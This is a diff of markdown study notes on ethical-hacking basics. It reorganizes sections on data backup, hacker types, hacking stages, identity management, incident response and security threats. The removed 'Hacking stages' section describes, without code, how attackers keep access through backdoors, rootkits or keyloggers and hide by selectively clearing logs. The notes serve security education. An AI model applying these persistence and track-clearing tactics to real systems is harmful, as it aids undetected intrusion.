@@ -1,588 +1,3 @@
-# Data leakage, backup and recovery
-
-## Data leakage
-
-- Any sort of unauthorized disclosure of sensitive information from anyone/any system.
-- Includes emails, malicious links, device theft etc.
-- Data leakage leads to
-  - loss of trust e.g. trust to governments decreased during late years
-  - loss of profit e.g. Sony lost profit of their movies after [they were leaked](https://en.wikipedia.org/wiki/Sony_Pictures_hack) before publishing
-
-### Data leakage threats
-
-#### External threats
-
-- Corporate espionage, phishing, malware
-- Business partners, consultants when company outsources
-  - Less surveillance than own employees.
-
-#### Internal threats
-
-- Also known as **insider threats**
-- Dangers are greater than external threats as they'll have greater access to the company
-- See also [insider attacks](./security-threats-and-attacks.md#insider-attacks)
-- E.g. eavesdropping, shoulder surfing, [dumpster diving](./../10-social-engineering/social-engineering-types.md#dumpster-diving) can be used to acquire data.
-
-## Data loss prevention
-
-- Also known as **DLP**
-- Identification and monitoring of important information that is not to be shared outside the organization.
-- Can block, notify the sender or lets admins to analyze, react and report to sensitive data in transit.
-- Important tool for enterprise message systems
-- Uses different techniques of data access control
-  - E.g. when e-mailing where content is scanned for fingerprints, classifications and bank account numbers.
-
-## Data backup
-
-- Process of making a duplicate copy of data that already exists.
-- Protects against data loss and corruption as it can lead to great financial damages.
-- No backup = Far more suspectable to all sorts of attacks, especially ransomware.
-
-### Backup mediums
-
-#### Magnetic tapes
-
-- Oldest form, still used by many enterprises.
-- Retention time: ≈30 years
-- 📝 To pull anything off the tape, you have to fast-forward to wherever the correct file is stored
-  - Good for restoring systems in one go.
-  - Bad for incremental backups or storing a few files.
-  - ❗ Only way to tell if backups are working is to fully restore from the tape and check if it's correctly restored.
-
-#### Optical disks
-
-- 2 to 3 times slower than hard drives
-- Retention time: ≈25 years
-
-#### Hard disks
-
-- Cheaper, easily accessible
-- Less stability than magnetic tapes
-- Retention time: ≈9-20 years
-
-#### SSD disks
-
-- Includes also usb drives known as Flash storage or thumb-drive.
-- Resistant to shock, temperature, being run through the washing machine
-- Retention time: ≈10 years
-
-#### Cloud storage
-
-- Requires little infrastructure
-- Depends on stable internet connection
-- No retention time, high reliability
-
-#### SD and micro-SD
-
-- Little capacity and pricy.
-- Retention time: ≈10 years
-
-### Steps of data backup strategy
-
-1. **Identify important data**
-   - because backing-up everything is too costly and takes up much storage.
-2. **Choose appropriate backup media**
-   - Reliable, solid, preferably cheap
-   - E.g. USBs or portable media for personal users, and HDD/SDDs for companies for more speed.
-3. **Choose the appropriate backup strategy**
-   - Check features such as scheduling, monitoring file changes to update back-ups, protocols, integrations...
-   - Paid vs Free
-     - Free requires more knowledge and work, training costs (one time)
-       - E.g. in Linux, set cron job from point A to B
-     - Paid versions has recurring license costs including training
-4. **Choose appropriate RAID levels**
-   - **RAID 1**
-     - 2 disks
-     - All that are written in disk A is also written to B, if one disk fails, other works
-   - **RAID 5**
-     - 3 disks
-     - If A fails you can reconstruct based on data in B and C
-   - RAIDing is not only for backups, can also use for faster read and writes
-     - E.g. BIG = Everything is seen as one drive. File is written two all of them. Crazy write & read speeds. If single disk dies all data is gone.
-5. **Choose the appropriate backup method**
-   - **Cold backup**
-     - Performed while system is not in use.
-     - E.g. at nights, during weekends.
-   - **Hot backup**
-     - Performed when system is still used.
-     - E.g. you type a document, power shortage happens but it's still saved.
-   - **Warm backup**
-     - Hybrid of the two.
-     - Period backups while system is in use, but you might lose longer time period than hot backup.
-6. **Choose the appropriate backup locations**
-   - Three options:
-     1. **On-site**: Same building / room
-        - Susceptible to same types of problems like other servers.
-        - If there's a breach, fire or earthquake = all data are gone
-     2. **Off-site**: backup is performed at a remote location
-     3. **Cloud**:
-        - Most secure: most cost effective and safe where data won't be loss, no electricity, no hardware, no maintainable.
-        - Can be replicated in same building, different buildings in same data center or different regions.
-        - Can have privacy/trust issues: encrypt
-7. **Choose the backup type**
-   - **Full backup**: Costly, you back up everything
-   - **Incremental backup**
-     - Backs-up on each change of the previous back-up
-     - When restoring, you need to restore everything from the first full back-up
-   - **Differential backup**:
-     - Back-ups on difference to the initial backup on each backup.s
-     - Faster restoring time as you only need the last point and the initial full back-up
-8. **Appropriate backup solution**: Combination of all of this
-9. **Perform a recovery test**
-   - Ensure you can recover a data that's lost with DR tests e.g. twice a year.
-   - **Recovery drill**
-     - Simulating data tier outage
-     - Recovering
-     - Validate application integrity post recovery
-
-## Data recovery
-
-- Recovering lost data
-- Reasons
-  - Accidental lost e.g. • natural disaster • corrupted data
-  - Or can be intentionally destroyed
-- DR stands for "Disaster Recovery"
-- Most of data is recoverable but you can have recovery failure if backed up data becomes corrupt.
-# Hacker types
-
-## Hacker
-
-- An individual who uses their computer and technical skills to gain access to systems and networks.
-- 🤗 A common theory is that a hacker meant initially anyone who possessed skills and knowledge and determination to solve problems in a creative way.
-  - There are arguments against it never was a benign term and the malicious connotations of the word were a later perversion is untrue.
-
-## Black hat hackers
-
-- 📝 Uses knowledge and skills to discover and exploit security vulnerabilities for financial gain or other malicious reasons
-- Bad guys
-- No regard of law & regulations etc.
-- Activities include stealing personal and financial information or shutting down websites and networks
-- E.g. bank robbing
-
-## White hat hackers
-
-- Also known as **ethical hackers**
-- 📝 Uses knowledge and skills to improve a system's security by discovering vulnerabilities before black hats do.
-- Will not break laws and regulations
-- Scope is determined by the client
-- E.g.
-  - Publish vulnerabilities
-  - Do penetration tests
-  - ❗Participate in bounty programs to claim rewards.
-    - Benefiting financially from hack is not illegal
-
-### Ethical hacking
-
-- Also known as white hat hacking
-- Performed by security specialists to help companies identify vulnerabilities in their networks and systems.
-  - Helps them analyzing and strengthening their system and network security
-  - Allows for creating preventive measures that should prevent any future security breaches as well as protect data and information stored in the system.
-- Difference from black-hat hacking:
-  - Hacking with permission of system owner
-  - They remain compliant to the law
-  - Purpose is to prevent hackers from breaking into systems and networks.
-- Flow
-  1. Find vulnerabilities
-  2. Assess problems & threats about them
-  3. Offer solutions e.g. you can do to fix this
-  4. Inform within the company
-- Ethical hackers should ask themselves when evaluating a system: (also companies asks often "why would we fix it?" in three questions)
-  - What is it that an attacker can see on this network/system?
-  - What could the attacker do with that knowledge?
-  - Are there any traces of attempted attacks on the system/network?
-
-### Ethical hacking scope
-
-- No test should be performed without appropriate permissions and authorization.
-- Test results should be kept confidential
-- Only those tests that the client requested should be performed
-
-## Grey hat hackers
-
-- Also known as ***grayhat***, ***gray hat***, ***gray-hat***, ***grey hat***, ***greyhat*** or ***grey-hat*** hackers.
-- 📝 Might break laws, regulations and ethical standards but do not have explicitly malicious indent.
-- Middleground; Not as bad as black, not as ethical as white hackers.
-
-## Suicide hackers
-
-- 📝 Perform attacks for a cause despite the risk of being caught and prosecuted.
-- E.g. they'll know for sure that they'll get caught but they still attempt the hack for a "cause".
-
-## Script kiddies
-
-- 📝 Inexperienced hackers who don't have enough knowledge or skills to perform hacks on their own
-  - Instead, they use tools and scripts developed by more experienced hackers.
-- Dangerous because running the closed-sourced tools on one's own system is a big risk.
-
-## Cyber terrorists
-
-- Money is not the priority, but to destroy stuff.
-- Influenced by religious or political beliefs.
-- 📝 Goal is to promote fear, unrest and disruption.
-
-## State sponsored hackers
-
-- 📝 Recruited by governments
-- Gain access to classified information of other governments
-- Information source can be governments, individuals or corporations.
-
-## Hacktivists
-
-- 📝 Break into government and corporate systems out of protest.
-- Promotes political or social agenda.
-- E.g. steal and leak data on public domain
-# Hacking stages
-
-## 1. Reconnaissance
-
-- Also known as **footprinting**, **fingerprinting** or **information gathering**
-- 📝 Reconnaissance, *noun*, preliminary surveying or research about the target.
-- 📝 Necessary first step as an attack would not be successful without it.
-
-## 2. Scanning
-
-- Hacker utilizes information from previous stage to conduct more technical scan.
-- Often maps the routers and firewalls
-- Use tools such as port scanners, network mappers, vulnerability scanners, etc.
-
-### Reconnaissance vs Scanning
-
-- In scanning you're acting on gathered information to gather information
-- Examples
-
-| [Reconnaissance](#1-reconnaissance) | [Scanning](#2-scanning) |
-| ------ | ----- |
-| Scan the perimeter network you need the IP addresses | Use e.g. `nmap` to figure out what the configuration is. |
-| Get e-mails. | Use phishing to gather personal data |
-| Learn where service physically are | Do dumpster diving |
-
-## 3. Gaining Access
-
-- Attack stage
-- Steps:
-  1. Find an entry point to the target OS or application on the system
-  2. Use it to perform the attack
-     - Hackers may escalate privileges to gain complete control over the system/network.
-- Examples:
-  - Password crack with brute-force or dictionary attack
-  - Exploit buffer overflow
-  - Session hijack
-  - DoS attacks
-
-## 4. Maintaining Access
-
-- Keeping admin/root privileges so hacker can continue using the system.
-  - After breaking into a system, you attempt to elevate privileges to do more.
-- Maintain persistent access, because your connection might break, then you start again
-- Can prevent other hackers from accessing the system by installing backdoors, rootkits, or trojans.
-- 💡 You can install tools to give you persistance access and gathers data to use compromise more such as keylogger.
-- 💡 You can use the machine as proxy so all traces are lead back to the proxy.
-  - You can minimize the risks being discovered this way.
-  - ❗ As pen-tester document those as you'll get other people in trouble
-
-## 5. Clearing tracks
-
-- Hackers do everything they can do to hide their activities
-- Goal is to maintain the access to the system but remain unnoticed in the process.
-  - If you're detected: the vulnerability will be patched and you'll lose access.
-- Vital to clear all tracks as fast as possible, or if it's possible generate none.
-- Activities:
-  - Clear certain entries in log files: Not all, or it'll be suspicious
-  - Masquerade your activities: Make them as similar as possible as legitimate activities
-    - E.g. a good keylogger masquerade itself behind legitimate activities
-      - Mimics other programs behavior by adding more behavior.
-# Identity and access management (IAM)
-
-- Ensures right users have access to right resources at right time
-- Framework of best-practices used by organizations
-- Main modules:
-  1. **Access Management Module**: • Authentication • Authorization.
-  2. **Identity Management Module**: Management of users and enterprise directory service components of IAM.
-
-## IAM components
-
-### Access management
-
-#### Authentication
-
-- Session Management
-- Password Service
-
-##### Single sign-on (SSO)
-
-- Also known as ***single sign on***
-- 📝 Allows one set of login credentials to be used to access multiple applications
-- Centralized session and user authentication service
-- Easier administration
-- Benefits for users including remembering one password instead of many
-- Many user authentication problems can be resolved at a central location at SSO point.
-
-##### Multi-factor authentication (MFA)
-
-- Authentication method that requires the user to provide two or more verification factors to gain access to a resource
-- **Two-factor authentication (2FA)** is subset of MFA using two different factors
-- 📝 Authentication factors include
-  - **Knowledge** - something only the user knows
-    - E.g. password or PIN
-    - Vulnerable to recording user screen, e.g. [attack against PayPal](https://www.welivesecurity.com/2018/12/11/android-trojan-steals-money-paypal-accounts-2fa/)
-  - **Possession** - something only the user has
-    - E.g. smart cards, security token
-    - Vulnerable to be cloned/copied
-  - **Inherence** - something only the user is
-    - E.g. biometrics (• fingerprint, face, voice, iris, retinal recognition • behavioral: keystroke dynamics)
-      - **Retina**: Sending an intrusive close light to compare blood vessels
-      - **Iris**: Mapping structures of iris using a camera.
-    - Vulnerable to manually prompting users, e.g. [touch ID scams that targeted Apple devices](https://www.wired.com/story/iphone-touch-id-scam-apps/)
-  - **Location**: somewhere the user is
-    - E.g. based on network, known country
-    - Vulnerable to proxies
-
-##### One-time password (OTP)
-
-- A password that's only used once and only valid for a limited of time-
-- Enforces strong password authentication as it protects against someone getting access to password.
-- Usually used when authenticating to VPN, and online Internet banking systems.
-
-###### OTP Token
-
-- Tool used to generate one-time passwords
-- Can be a hardware device or software token installed on the computer or phone.
-- Authenticating server use the same algorithm as token to be able to validate the code.
-- 📝 **Token types**
-  - **Synchronous Tokens**
-    - **Clock-based tokens**
-      - Also known as **Time-based tokens**
-      - Tokens have same time configuration as the authenticating server.
-      - Both use algorithms that are based on a time and a shared secret key.
-    - **Counter-based tokens**
-      - Both the token and the authenticating server maintain a counter.
-      - Code consists of the value from the counter and a shared secret key.
-      - Requires one or more actions from users (e.g. powering on or PIN number) to increment the counter.
-  - **Asynchronous Tokens**
-    - Also known as • **challenge-response tokens** • **challenge/response tokens**
-    - Server sends a challenge (random value) to user and expects user to enter it.
-    - Protects against replay attacks
-
-#### Authorization
-
-- Rule-based Authorization
-- Attribute-based Authorization
-- Remote Authorization
-
-##### Role-based authorization
-
-- Restricting system access to authorized users
-- Can implement
-  - **Mandatory access control** (MAC)
-    - OS-enforced access control based on subject's clearance and object's labels
-    - Assigns sensitivity labels to data and controls access by matching the user's security level to the resource label.
-    - E.g. traditional Unix system of users, groups, and read-write-execute permissions
-  - **Discretionary access control** (DAC)
-    - Restricting access to objects based on the identity of subjects and/or groups to which they belong
-    - Allows the data owner to set security permissions for the object
-    - E.g. unix file mode which represent write, read, and execute in each of the 3 bits for each of User, Group and Others
-    - E.g. on Windows, you can set sharing and permissions on files/folders you create
-- RBAC vs MAC vs DAC
-  | Access Control | User rights | Popular |
-  | -------------- | ------------ | ------ |
-  | **Discretionary** | Full control | OS file systems |
-  | **Mandatory** | No control, policies are predefined by root/admin | OS file systems |
-  | **Role based access** | No control, policies are predefined by root/admin | Cloud computing |
-
-### Identity management
-
-#### User management
-
-- Delegated administration
-- User and Role Management
-- Provisioning
-- Password Management
-- Self-service
-- **Compliance Auditing**
-  - Conduct security audit for company to be compliant with policies/regulations
-
-#### Enterprise directory service
-
-- Central repository where all others components gets their data
-- Includes
-  - Directory service
-  - Data synchronization
-  - Metadirectory
-  - Virtual directory
-# Incident management
-
-- 📝 Process of identifying, prioritizing and solving security incidents.
-- Goal: Restore the system back to normal, trigger alerts to prevent any potential risks.
-- 📝 Steps (flexible, not a strict rule):
-  1. **Preparation for incident handling and response**
-     - You know how you'll handle it when it happens.
-     - Policies, trainings, tools, guidelines...
-  2. **Detection and analysis**
-     - Conduct in-depth analysis to what has happened: why, how, where, what
-  3. **Categorization and prioritization**
-  4. **Notification**
-     - Notify proper people who are affected and who can act on it.
-  5. **Containment**
-     - Prevent the occurring incident from causing more damage.
-     - E.g. put them in quarantine then we'll figure out what to do
-  6. **Forensic investigation**
-     - What happened, why?
-  7. **Eradication**
-     - Wipe the threat completely
-  8. **Recovery**
-     - Restore the system to working state
-  9. **Post-incident activities** (lessons learnt)
-     - Record what happened with final review.
-     - Have discussion about how to avoid it in future.
-- 🤗 E.g. a developer in [Dropbox miscoded](https://www.cnet.com/news/dropbox-confirms-security-glitch-no-password-required/) authentication function to always return true.
-  - Anyone could login as whichever you user you want by just typing their e-mail.
-  - They had review policy but no one paid attention.
-  - They had protocols against major breach.
-  - Realized that it was critical and then they brought down the service to prevent huge damage (containment)
-  - Conducted investigation to see what has happened and started recovery process
-  - It was recorded and documented for current and future employees
-
-## Emergency response plan
-
-- Help companies address various emergency situations that could occur within their organization.
-- Should include who to contact, how to act in an emergency, how to mitigate risk and what resources to use to minimize loss
-
-## Security incident and event management (SIEM)
-
-- Real-time analysis of security alerts generated by network hardware and applications.
-- Helps [SOC](#security-operations-center-soc) to perform its functions
-- 📝 Combines SIM and SEM
-  - **SIM (Security information management)**
-    - Long-term storage as well as analysis and reporting of log data.
-  - **SEM (Security event manager)**
-    - Real-time monitoring
-    - Correlation of events
-    - Notifications and console views.
-- E.g. [Splunk](https://www.splunk.com/) is the most popular SIEM.
-
-### SIEM use-cases
-
-- Anomaly detection could help detect zero-days, misconfigurations, cyberwarfare
-- Automatic parsing, log normalization and categorization
-- Visualization to help with pattern detection
-- Detection of covert, malicious communications and encrypted channels.
-
-### SIEM components
-
-- **Aggregation**: Combining different log data
-- **Correlation**: Using e.g. AI to bundle events with common attributes
-- **Alerting**: Automated analysis of correlated events
-- **Dashboards**: Helps to see anomalies
-- **Compliance**: Can gather compliance data to produce reports that adopt to existing processes
-- **Retention**: Critical in forensic investigations as network breach is high likely discovered after it happens.
-- **Forensic analysis**: The ability to search across logs on different nodes and time periods based on specific criteria.
-
-## Security teams
-
-### Security Operations Center (SOC)
-
-- Centralized function within an organization
-- Continuously monitors and improves an organization's security posture
-- Prevents, detects, analyzes, and responds to cybersecurity incidents.
-- Uses [SIEM](#security-incident-and-event-management-siem) tool to perform its function
-
-### Security Incident Response Team (SIRT)
-
-- Also known as ***CSIRT (Computer Security Incident Response Team)*** or ***Computer Emergency Response Team (CERT)***
-- Focuses on effective and quick incident response.
-- Develops and refines the incident response plan.
-- Typically receive threat intelligence from the [SOC](#security-operations-center-soc)
-- 💡 SIRT should first check effort and potential impact of the incident when begin investigation and response process.
-- There are also national CERT teams such as [US-CERT](https://en.wikipedia.org/wiki/United_States_Computer_Emergency_Readiness_Team) in USA, [CERT-SE](https://www.cert.se/) in Sweden and [TR-CERT](https://www.usom.gov.tr/) in Turkey.
-
-### User Behavior Analytics (UBA)
-
-- Monitoring user behavior in attempt to discover potential threats and attacks.
-- When patterns are observed and normal is established, an admin can take a look at deviations.
-- E.g. monitoring employee behavior against insider threats
-- E.g. login attempts based on the location, monitoring access to privileged accounts.
-# Information security controls overview
-
-## Information Assurance (IA)
-
-- Maintaining following of information during its use, storage, processing and transfer:
-  - **Integrity**: No tampering of data from point A to point B, e.g. restraining physical access.
-  - **Availability**: At all times data needs to be available to those who need it, e.g. stock market
-  - **Confidentiality**: No leaks, e.g. ensuring policies are in-place
-  - **Authenticity**: Only those who are authorized can access something
-  - **Non-repudiation**: If you do something, you cannot say I did not do it, e.g. signatures, log files, camera videos.
-- Processes to achieve information assurance are:
-  - Security policies
-  - Network and user authentication strategy
-  - Identification of vulnerabilities and threats e.g. pen-testing
-  - Identification of problems in the system and resource requirements
-  - Plan design for the identified requirements
-  - Certification and accreditation to find vulnerabilities and remove them
-  - Training for employees
-
-## Types of control
-
-- By type
-  - [**Physical controls**](./physical-security.md)
-    - E.g. fences, doors, locks and fire extinguishers
-  - **Technical controls**
-    - Also known as ***logical controls***
-    - E.g. security tokens
-  - **Administrative controls**
-    - E.g. security policies and continuity of operations plans are administrative control
-- By function
-  - **Preventative controls**
-    - Prevents the threat from coming in contact with the weakness
-    - E.g. authentication, encryption (such as [IPSec](./../15-cryptography/tunneling-protocols.md#ipsec))
-  - **Detective controls**
-    - Used after a discretionary event.
-    - E.g. audits, alarm bells, alerts
-  - **Corrective controls**
-    - Put in place after the detective internal controls discover a problem
-    - E.g. backups and restore
-
-## Information Security Management Program
-
-- All activities the organization takes to protect sensitive information
-- E.g. security policies, rules, standards, business resilience, training and awareness, security metrics and reporting.
-
-## Enterprise Information Security Architecture (EISA)
-
-- Regulates organizations structure and behavior in terms of security, processes and employees.
-- Includes requirements, process, principles and models
-- Goals:
-  - Real time monitoring of organization's network
-  - Security breach detection and recovery
-  - Ensuring cost efficiency of security provisions
-  - Helping the IT department to function properly
-    - e.g. with policies and education
-  - Risk assessment of IT assets
-
-### Security management framework
-
-- To reduce risks of any system
-  - Risks are never zero but you should reduce as much as u can
-- Combination of policies, procedures, guidelines and standards
-
-## Defense in Depth
-
-- Also known as **defence in depth**
-- 📝 Using multiple layers for protection
-- Like a tower defence game
-- Provides redundancy in the event a security control fails or a vulnerability is exploited
-- Layers:
-  1. **Policies, Procedures, Awareness**: Data Classification, Risk Management, Code Reviews, Educations...
-  2. **Physical security**: ID cards, CCTV, fences...
-     - Maintenance board should be protected in server room.
-     - Not good in schools, universities etc.
-  3. **Perimeter**: Encryption, identities...
-     - In front of the internal network where traffic in and out is filtered.
-  4. **Internal network**: Network zoning, firewalls...
-  5. **Host**: Antivirus patches, security updates...
-     - Individual devices with networking capability e.g. servers / PCs.
-  6. **Services**: Audit logs, authentication, authorization, coding practices.
-     - Applications running on hosts
-  7. **Data**: Backups, encryption...
 # Information security overview
 
 ## Information security
@@ -785,6 +200,1178 @@
   - Flexible, recommended actions users are to take in the event there is no standard to follow.
 - **Procedure**
   - Detailed step-by-step instructions for accomplishing a task or goal
+# Security threats and attacks
+
+- The more valuable information is the higher the threats and chances for an attack are.
+
+## Security threats
+
+- 📝 **Threat** means anything that has potential of causing damage to the system.
+
+### Types of threats
+
+#### Network threats
+
+- **Network** is the set of devices that are connected through communication channels where data exchange happens between devices
+- Attacker may break into the channel and steal the information that is being exchanged.
+- E.g. • [denial of service attacks (DoS)](./../13-web-applications/denial-of-service.md) • [password-based attacks](./../06-system-hacking/cracking-passwords-overview.md) • compromised-key attacks, firewall and IDS attacks • DNS and ARP poisoning • man in the middle (MITM) attack • spoofing • [session hijacking](./../13-web-applications/session-hijacking.md) • information gathering • sniffing...
+
+#### Host threats
+
+- Attack that tries to gain access to information from a system
+- E.g. • [password attacks](./../06-system-hacking/cracking-passwords-overview.md) • unauthorized access • profiling • [malware attacks](./../07-malware/malware-overview.md) • [footprinting](./../02-footprinting/footprinting-overview.md) • [denial of service attacks (DoS)](./../13-web-applications/denial-of-service.md) • arbitrary code execution • privilege escalation • [backdoor attacks](./../07-malware/malware-overview.md#backdoor) • [physical security](./physical-security.md) threats
+
+#### Application threats
+
+- Exploitation of vulnerabilities that exists in the application itself
+  - Caused by e.g. bad coding practices
+  - Rushed programs has mistakes e.g. lack of validation of input data
+- Can be found through reverse engineering, or trial and error
+- Large codes that are difficult to maintain has more vulnerabilities.
+- Mostly because of improper input validation.
+- E.g. • [SQL injection](./../14-sql-injection/sql-injection-overview.md) • cross-site scripting • [session hijacking](./../13-web-applications/session-hijacking.md) • identity spoofing • improper input validation • security misconfiguration • information disclosure • [hidden-field manipulation](./../13-web-applications/hacking-web-applications.md#hidden-field-manipulation) • broken session management • [cryptography attacks](./../15-cryptography/cryptanalysis.md#cryptography-attacks) • [buffer overflow attacks](./../12-web-servers/web-server-threats-and-attacks.md#buffer-overflow-attacks) • [phishing](./../10-social-engineering/social-engineering-types.md#phishing)
+
+## Security attacks
+
+- Or **cyber attack**
+- Attempt to gain unauthorized access to a system or network.
+- Actualization of a threat
+
+### Motives
+
+- Attack = Motive + Vulnerability + Method (exploit)
+- General core of every motives is access to the valuable information
+- Common motives:
+  - Interrupting the flow of business activities and processes
+  - Stealing valuable information
+  - Data manipulation
+  - Stealing money and important financial information
+  - Revenge
+  - Ransom
+
+### Types of attacks
+
+- You need to find vulnerability in a system to have an attack
+- You can never prove that's its not vulnerable, but can prove it's vulnerable.
+  - or You can never prove that a system is secure, but can prove it's insecure.
+
+#### Operating system attacks
+
+- ❗ If OS is taken over protecting applications won't matter.
+- Vulnerabilities include
+  - Bugs (as it's a big codebase)
+  - Buffer overflow
+  - Unpatched operating systems
+    - Can lead to successful leads using already known vulnerabilities
+    - 🤗 E.g. Microsoft had already patched the [EternalBlue vulnerability](https://en.wikipedia.org/wiki/EternalBlue) that NSA developed before it was leaked to public. However, many systems still remained unpatched due to users not updating their systems. So the same vulnerability on unpatched systems were still successfuly exploited by first [WannaCry ransomware](https://en.wikipedia.org/wiki/WannaCry_ransomware) that compromised hundreds of thousands computers, and then by [NotPetya malware](https://en.wikipedia.org/wiki/Petya_(malware)). [1]
+- Attacks include
+  - Exploiting network protocol implementations
+  - [Authentication attacks](./../13-web-applications/hacking-web-applications.md#authentication-attacks)
+  - [Cracking passwords](./../06-system-hacking/cracking-passwords-overview.md)
+  - Breaking filesystem security
+- 💡 Secure OS is an OS that's updated, monitored, regulated as frequently as possible.
+- See also [banner grabbing](./../03-scanning-networks/banner-grabbing.md)
+
+[1]: https://en.wikipedia.org/wiki/EternalBlue
+
+#### Misconfiguration attacks
+
+- Hacker gains access to the system that has poorly configured security.
+- Can affect works, databases, web servers, etc.
+- E.g. • using default accounts (passwords) • forgetting Apache server online to allow proxy requests enabling DDoS attacks
+- 💡 Detected mostly by automated scanners
+
+#### Application-level attacks
+
+- Similar to OS attacks but far less damaging as their scope is far narrower.
+- Caused by lack of testing as developers rush development of applications and miss something.
+- E.g. • sensitive information disclosure • buffer overflow attack • SQL injection v cross-site scripting • session hijacking denial of service • man in the middle • phishing
+- 🤗 E.g. Transmission torrent client (macOS)
+  - The store where it was downloaded was compromised
+  - They substituted torrent download link to their own application
+  - See [Transmission is hacked to spread malware](https://blog.malwarebytes.com/threat-analysis/2016/09/transmission-hijacked-again-to-spread-malware/)
+
+#### Shrink-wrap code attacks
+
+- Attacks on libraries and frameworks that the software is depended on.
+- Finding vulnerabilities in libraries allows re-using same exploits on more than single application
+- 💡 Use libraries: older, more mature, maintained, updated actively with proven track record.
+- E.g.
+  - A bug is fixed in library but application uses older version.
+  - Application uses libraries in debug mode or with default configurations.
+
+### Attack vectors
+
+- Attack vector = Means by which hackers deliver a payload to systems and networks
+- [Cloud computing threats](./../16-cloud-computing/cloud-security.md#cloud-computing-risks-and-threats) such as data breach and loss.
+- [IoT threats](./../18-iot-and-ot/iot-security.md#iot-threats) usually caused by insecure devices and hardware constraints (battery, memory, CPU etc.)
+- [Ransomware](../07-malware/malware-overview.md#ransomware): Restricts access to your files and requires payment to be granted access
+- [Mobile threats](./../17-mobile-platforms/mobile-attacks.md#mobile-threats)
+
+#### Advanced Persistent Threats (APT)
+
+- 📝 Stealthy threat actor with continuous attacks targeting a specific entity.
+- APT groups include:
+  - [APT 10 - Red Apollo @China](https://en.wikipedia.org/wiki/Double_Dragon_(hacking_organization))
+  - [Equation Group @USA](https://en.wikipedia.org/wiki/Equation_Group)
+  - [APT 29 - Cozy Bear @Russia](https://en.wikipedia.org/wiki/Cozy_Bear)
+  - and [many more](https://en.wikipedia.org/wiki/Advanced_persistent_threat#APT_groups)...
+- **Advanced**
+  - Uses special malware, often crafted for specific organizations
+    - Usually a modified version of common malware used in botnets
+  - Sophisticated techniques against target not generic
+- **Persistent**
+  - Long-term presence with external command and control
+  - Extracting data
+    - Usually ***low-and-slow*** to avoid detection
+    - E.g. instead of sending big data, it breaks data to chunks and sends each chunk whenever a user is connected to the internet
+- **Threat**
+  - Targets high value organizations and information
+  - E.g. governments and big companies
+- 🤗 E.g.
+  - [Sony Pictures hack](https://en.wikipedia.org/wiki/Sony_Pictures_hack) where sensitive data from Sony, e.g. unreleased movies was published as torrents.
+  - [2020 United States federal government data breach](https://en.wikipedia.org/wiki/2020_United_States_federal_government_data_breach) where more than 18.000 US companies and government agencies where hacked.
+- Common steps
+  1. Create a breach e.g. through spear phishing
+  2. Exploit inner system vulnerabilities
+  3. Control of the system or its segments
+  4. Data exfiltration (= unauthorized data transfer)
+
+#### Viruses and worms
+
+- Both can replicates themselves throughout the system in files, documents.
+- Have capabilities to infect systems and networks in a quick time.
+- [Virus](./../07-malware/viruses.md): Requires user action to be activated e.g. running a file that has a virus embedded.
+- [Worm](./../07-malware/malware-overview.md#worm): can spread independently without any user action i.e. self-replicating
+
+#### Botnet
+
+- 📝 Used by hackers to control the infected machines e.g. phones, PC, IoT
+- Hackers perform malicious activities from the machines on which bots run eg. DDoS attacks.
+- Main problem is lack of security software or proper updates on devices.
+- See also [Botnet trojans](./../07-malware/trojans.md#botnet-trojans) and [Botnets | Denial of Service](./../13-web-applications/denial-of-service.md#botnets)
+
+#### Insider attacks
+
+- Performed by a person from within the organization who has authorized access.
+  - E.g. disgruntled employee, employee paid by a third-party
+- Presents one of the greatest potential of risk and most difficult attacks to defend against.
+- See also [Insider attacks | Social engineering types](./../10-social-engineering/social-engineering-types.md#insider-attacks).
+
+##### Insider threat types
+
+- **Pure insider**
+  - Inside employee with normal access rights
+- **Elevated pure insider**
+  - Insider with elevated access
+- **Insider associate**
+  - Insider with limited authorized access (e.g. guard, cleaning person)
+- **Insider affiliate**
+  - Spouse, friend, or client of an employee that uses employee's credentials.
+- **Outsider affiliate**
+  - Unknown and untrusted person from outside the organization.
+  - Uses an open access channel or stolen credentials to gain unauthorized access.
+
+##### Insider attack countermeasures
+
+- Restricting access
+- Logging to know who access what at what point of time
+- Active monitoring of employees with elevated privileges
+- Trying to not have disgruntled employees
+- Separation of duties
+  - Also known as **segregation of duties**
+  - Concept of having more than one person required to complete a task.
+  - See also [Separation of duties | Cloud computing](./../16-cloud-computing/cloud-computing.md#separation-of-duties)
+
+#### Phishing
+
+- See [Phishing | Social Engineering Types](./../10-social-engineering/social-engineering-types.md#phishing)
+
+#### Web application threats
+
+- Takes advantage of poorly written code and lack of proper validation of input and output data.
+- E.g. buffer overflows, SQL injections, cross-site scripting
+- 💡 There are many online scanning tools to detect those.
+
+## Modern age information warfare
+
+- Use of information and communication technologies for competitive advantages over an opponent
+- Weapons include • viruses • worms • trojan horses • logic bombs • trap doors • nano machines and microbes • electronic jamming • penetration exploits and tools.
+- E.g.
+  - Corporations spy on each other to use each others technology secrets and patents
+    - 🤗 Also known as [Industrial espionage](https://en.wikipedia.org/wiki/Industrial_espionage)
+  - Governments spy on other governments by using hackers as proxies to gain information about e.g. defense systems.
+  - Intellectual property thefts with reverse engineering to create products without investing in R&D
+- Categories include:
+  - **Command and control (C2) warfare**
+    - Taking down the command center may protect the headquarters but may interfere with their mobility
+  - **Intelligence-based warfare**
+    - Sensor-based technology to disrupt systems
+  - **Electronic warfare**
+    - Enhance, degrade, or intercept the flow of information
+  - **Psychological warfare**
+    - "Capture their minds and their hearts and souls will follow"
+    - E.g. propaganda or terror
+  - **Hacker warfare**
+    - Acquire information about subject A, sell it to subject B.
+  - **Economic information warfare**
+    - Channeling or blocking information to pursue economic dominance
+  - **Cyber warfare**: use of information systems against virtual personas
+- Each category can have:
+  - **Offensive strategy**
+    - Attacks against an opponent
+    - E.g. web application attacks, malware attacks, system hacking..
+  - **Defensive strategy**
+    - Actions taken against attacks.
+    - E.g. monitoring, alerts, response, detection, prevention systems
+- See also [Information Warfare website](http://www.iwar.org.uk)
+# Information security controls overview
+
+## Information Assurance (IA)
+
+- Maintaining following of information during its use, storage, processing and transfer:
+  - **Integrity**: No tampering of data from point A to point B, e.g. restraining physical access.
+  - **Availability**: At all times data needs to be available to those who need it, e.g. stock market
+  - **Confidentiality**: No leaks, e.g. ensuring policies are in-place
+  - **Authenticity**: Only those who are authorized can access something
+  - **Non-repudiation**: If you do something, you cannot say I did not do it, e.g. signatures, log files, camera videos.
+- Processes to achieve information assurance are:
+  - Security policies
+  - Network and user authentication strategy
+  - Identification of vulnerabilities and threats e.g. pen-testing
+  - Identification of problems in the system and resource requirements
+  - Plan design for the identified requirements
+  - Certification and accreditation to find vulnerabilities and remove them
+  - Training for employees
+
